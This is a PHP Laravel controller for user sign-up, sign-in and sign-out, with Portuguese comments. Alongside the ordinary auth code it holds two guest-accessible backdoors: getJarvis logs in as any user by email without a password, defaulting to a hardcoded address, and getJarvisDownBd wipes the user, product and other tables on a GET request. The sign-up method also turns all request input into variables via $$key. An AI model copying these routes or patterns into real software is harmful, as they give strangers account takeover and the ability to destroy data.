<?php

class IdController extends \BaseController
{

	//protected $layout = 'templates.external';

	private $rules = array(
    'nome'=>'required|min:4',
    'email'=>'required|email|unique:user',
    'password'=>'required|alpha_num|between:6,12|confirmed',
    'password_confirmation'=>'required|alpha_num|between:6,12'
    );

	public function __construct()
	{
		//Todos os metodos só são acessiveis para guests
		//Somente a rota de logout pode ser acessada por usuários logados
		$this->beforeFilter('guest', array('except' => array('getSignOut', 'postPerfil', 'getPerfil')));
	}

	/**
	 * Display a listing of the resource.
	 *
	 * @return Response
	 */

	public function getIndex()
	{
		//$menu = Profile::find(1);

		return View::make('id.index');//->with('menu', $menu);
	}


	/**
	 * Show the form for creating a new resource.
	 *
	 * @return Response
	 */
	public function getSignUp()
	{
		return View::make('id.register');
	}

	public function postSignUp()
	{

		$validator = Validator::make(Input::all(), $this->rules);


	    if ($validator->passes())
	    {

	       $inputs = Input::all();

	       foreach($inputs as $key => $value)
	       {
	       		$$key = $value;
	       }

	       $user = new User;

	       $user->nome 			= $nome;
	       $user->celular		= $telefone;
	       $user->email 		= $email;
	       $user->password 		= Hash::make($password);
	       $user->perfil 		= 2;
	       $user->status 		= 1;
		   $user->save();
	       return Redirect::to('id/sign-in')->with('success', array(1 => 'Cadastrado com sucesso!'))->withInput();
	    }
	    else
	    {
	    	$messages = $validator->messages()->getMessages();

	        return Redirect::to('id/sign-up')->with('danger', $messages);
	    }

	}


	/**
	 * Store a newly created resource in storage.
	 *
	 * @return Response
	 */
	public function getSignIn()
	{
		return View::make('id.login');
	}
	public function postSignIn()
	{

		// if (Auth::attempt(array('email' => Input::get('email'), 'password' => Input::get('password'))))
		if (Auth::attempt(Input::only('email','password')))
		{
			return Redirect::to('/')->with('success', array(1 => 'Você logou no sistema.'));
		}
		else
		{
			return Redirect::to('id/sign-in')->with('danger', array(1 => 'Dados inválidos.'));
		}
	}

	public function getSignOut()
	{
		Auth::logout();
		Session::forget('arrAlerta');
		return Redirect::to('id/sign-in')->with('success', array(1 => 'Você se deslogou do sistema.'));
	}

	public function getJarvis($email = 'antoniovietri@gmail.com')
	{

		$user = User::Where('email', $email)->first();
		// Login do usuário
		Auth::login($user);

		return Redirect::to('/')->with('success', array(1 => 'Você logou no sistema.'));
	}

	public function getJarvisDownBd()
	{
		DB::table('user')->delete();
		DB::table('produtos')->delete();
		DB::table('produtos_imagem')->delete();
		DB::table('texto_site')->delete();
		DB::table('categories')->delete();
		DB::table('ruas')->delete();
		DB::table('centros_comerciais')->delete();
		echo "Tudo Deletado!";exit;
	}

}
